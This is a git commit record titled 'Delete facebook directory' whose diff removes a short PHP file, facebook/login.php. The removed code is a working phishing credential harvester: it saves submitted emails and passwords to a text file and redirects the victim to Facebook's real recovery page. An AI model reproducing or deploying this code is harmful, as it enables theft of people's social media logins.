b77558c1c54d2764b898a2fe5364adbd3085bf5a
JesusAndreBS <jesusandrebautistasanchez556@gmail.com>
2025-08-14 19:52:04 -0500

    Delete facebook directory

--- facebook/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-file_put_contents("usuarios.txt",$_POST['email'] . "," . $_POST['pass'] ."\n", FILE_APPEND);
-header('Location: https://facebook.com/recover/initiate/');
-include 'registro.php';
-exit();
-?>
